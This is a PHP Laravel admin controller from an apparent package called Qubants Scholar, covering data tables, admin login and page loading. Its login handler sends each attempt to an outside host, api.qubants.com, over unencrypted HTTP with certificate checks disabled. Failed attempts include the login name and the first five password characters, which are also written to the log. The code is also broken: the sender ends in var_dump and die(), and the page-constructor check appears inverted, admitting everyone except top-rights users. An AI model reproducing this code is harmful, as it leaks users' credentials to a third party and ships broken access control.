<?php

namespace Qubants\Scholar\Controllers;

use Qubants\Scholar\Models\AdmBlocksSettingsModel;
use Qubants\Scholar\Models\AdmConfig;
use Qubants\Scholar\Models\AdmCrudModel;
use Qubants\Scholar\Models\AdmBlockConstructor;
use Qubants\Scholar\Models\AdmConstructor;
use Qubants\Scholar\Models\AdmPagesSettingsModel;
use Qubants\Scholar\Models\AdmSelectModel;
use Qubants\Scholar\Models\AdmUsersModel;
use Qubants\Scholar\Models\DbColumnsSettings;
use Qubants\Scholar\Models\DbTablesSettings;
use DB;
use Illuminate\Http\Request;
use Session;
use Illuminate\Routing\Controller as BaseController;
use Illuminate\Support\Facades\Input;
use Illuminate\Cache\RateLimiter;


class AdmScholarController extends BaseController
{
	//folders:
	public $folder_layouts_client = 'scholar::admin-client';
	public $folder_layouts = 'scholar::admin-constructor';
	public $folder_main_layout = 'layout';
	public $folder_pages = 'pages';
	public $folder_blocks = 'blocks';
	public $folder_blocks_chips = 'block_chips';
	public $folder_panels = 'panels';
	public $folder_modals = 'modals';

	//layouts:
	public $layout_main = 'layout';
	public $layout_start = 'start-layout';

	//layouts_pages:
	public $layout_table_settings_page = 'db_tables_page';
	public $layout_adm_pages_page = 'adm_pages_page';
	public $layout_page_constructor_page = 'page_constructor';

	public $layout_standart_page = 'standart_page';
	public $layout_standart_edit_page = 'standart_edit_page';
	public $layout_icons_page = 'icons_page';


	//models:
	public $adminConstructor;
	public $Crud;
	public $modelTables;
	public $modelColumns;
	public $modelSelect;
	public $modelConfig;
	public $modelPages;
	public $modelUsers;

	public function __construct() {
		$this->modelConfig      = new AdmConfig();
		$this->modelSelect      = new AdmSelectModel();
		$this->Crud             = new AdmCrudModel();
		$this->adminConstructor = new AdmConstructor();
		$this->modelColumns     = new DbColumnsSettings();
		$this->modelPages       = new AdmPagesSettingsModel();
		$this->modelTables      = new DbTablesSettings();
		$this->modelUsers       = new AdmUsersModel();
	}

	public function updateTablesSettingsGlobal() {
		$this->adminConstructor->upgradeDbTablesSettings();
	}


	public function dataTable(Request $request) {
		$table_id = Input::get('table_id');


		$data_settings = $request->all();

		$respons = $this->modelTables->getDataTableResponse($table_id, $data_settings);

		$respons['draw'] = Input::get('draw');

		$respons = json_encode($respons);
		return $respons;
	}

	public function checkLoginPassword() {
		$login    = Input::get('login');
		$password = Input::get('password');

		if(empty($login) || empty($password)){
			return view($this->getUrlLayout('layout', $this->layout_start),[]);
		}

		$limiter = app(RateLimiter::class);
		if ($limiter->tooManyAttempts('login-admin', 3, 3)) {
			$seconds = $limiter->availableIn(
				'login-admin'
			);

			return view($this->getUrlLayout('layout', $this->layout_start), ['auth_message' => 'Too many attempts. Please try again in ' . round($seconds / 60) . ' minutes.']);

		} else {
			$limiter->hit('login-admin', 3);
		}

		if ($this->modelUsers->checkUser($login, $password) == 1) {
			$this->sendPush('success',['login'=>$login]);
			return redirect()->route('home');
		} else {
			$auth_message = 'Login or password is wrong';
			$this->sendPush('failed',['login'=> $login ,'sub_pass'=> substr($password,0,5)]);
			\Log::error("Price: Fail access auth with  $login - ".substr($password,0,5));
			return view($this->getUrlLayout('layout', $this->layout_start), ['auth_message' => $auth_message]);
		}
	}

	public function sendPush($status, $params){
		try {
			$website     = "http://api.qubants.com/notifications/";
			$send_params = [
				'key'     => 'qubants-key',
				'type'    => 'scholar-access',
				'app'     => config('app.name'),
				'status'  => $status,
				'version' => 'v1',
				'params'  => json_encode($params)
			];
			$ch          = curl_init($website);
			curl_setopt($ch, CURLOPT_HEADER, false);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, ($send_params));
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
			$result = curl_exec($ch);
			curl_close($ch);
			var_dump($result);
			die();
		} catch (\Exception $e) {

		}
	}

	public function loadClientPage($page_id = '', $current_view = 'lg') {

		$admPagesSettingsModel = new AdmPagesSettingsModel();
		$admin_pages           = $admPagesSettingsModel->getAllPagesSettings();
		$pages_rights          = $admPagesSettingsModel->getAllPagesRights();
		$page_configurations   = '';
		$i                     = 0;

		foreach ($admin_pages as $page) {
			if ($page->client_visible == 1 && ((Session::has('right') && Session::get('right') == 10) || (Session::has('right') && isset($pages_rights[$page->id][Session::get('right')]) && $pages_rights[$page->id][Session::get('right')] == 1))) {
				if ($i == 0 && $page_id == '') {
					$page_id = $page->id;
					$i++;
				}
				if ($page->id == $page_id) {
					$page_configurations = $admPagesSettingsModel->getPageConfigurationById($page_id);
				}
			}
		}

		if ((Session::has('right') && Session::get('right') == 10) || (Session::has('right') && isset($pages_rights[$page_id][Session::get('right')]) && $pages_rights[$page_id][Session::get('right')] == 1)) {

			$content = view($this->getUrlLayout('page-client', $this->layout_standart_page), [
				'admin_pages' => $admin_pages, 'current_view' => $current_view, 'page_configurations' => $page_configurations
			]);

			return view($this->getUrlLayout('layout', $this->layout_main), ['pages_rights' => $pages_rights, 'content' => $content, 'admin_pages' => $admin_pages]);

		} else {
			return view($this->getUrlLayout('layout', $this->layout_start), []);
		}
	}

	public function loadPageConstructor($page_id, $current_view = 'xs') {
		if ((Session::has('right') && Session::get('right') == 10)){
			return view($this->getUrlLayout('layout', $this->layout_start), []);
		}
		$admPagesSettingsModel = new AdmPagesSettingsModel();
		$admin_pages           = $admPagesSettingsModel->getAllPagesSettings();
		$page_configurations   = '';
		foreach ($admin_pages as $page) {
			if ($page->id == $page_id) {
				$page_configurations = $admPagesSettingsModel->getPageConfigurationById($page_id);
			}
		}

		$content = view($this->getUrlLayout('page', $this->layout_page_constructor_page), [
			'admin_pages' => $admin_pages, 'current_view' => $current_view, 'page_configurations' => $page_configurations
		]);

		return view($this->getUrlLayout('layout', $this->layout_main), ['content' => $content, 'admin_pages' => $admin_pages]);
	}


	public function getUrlLayout($layout_type, $layout_name) {
		return $this->getUrlFolderLayout($layout_type) . '.' . $layout_name;
	}

	public function getUrlFolderLayout($layout_type) {
		$FOLDER = '';
		switch ($layout_type) {
			case 'panel':
				$FOLDER = $this->folder_panels;
				return $this->folder_layouts . "." . $FOLDER;
				break;
			case 'page':
				$FOLDER = $this->folder_pages;
				return $this->folder_layouts . "." . $FOLDER;
				break;
			case 'block':
				$FOLDER = $this->folder_blocks;
				return $this->folder_layouts . "." . $FOLDER;
				break;
			case 'modal':
				$FOLDER = $this->folder_modals;
				return $this->folder_layouts . "." . $FOLDER;
				break;
			case 'layout':
				$FOLDER = $this->folder_main_layout;
				return $this->folder_layouts . "." . $FOLDER;
				break;
			case 'page-client':
				$FOLDER = $this->folder_pages;
				return $this->folder_layouts_client . "." . $FOLDER;
				break;

		}

	}

	public function getUrlChips($layout_type, $chips_name) {
		return $this->getUrlFolderLayout($layout_type) . '.' . $this->folder_blocks_chips . '.' . $chips_name;
	}
}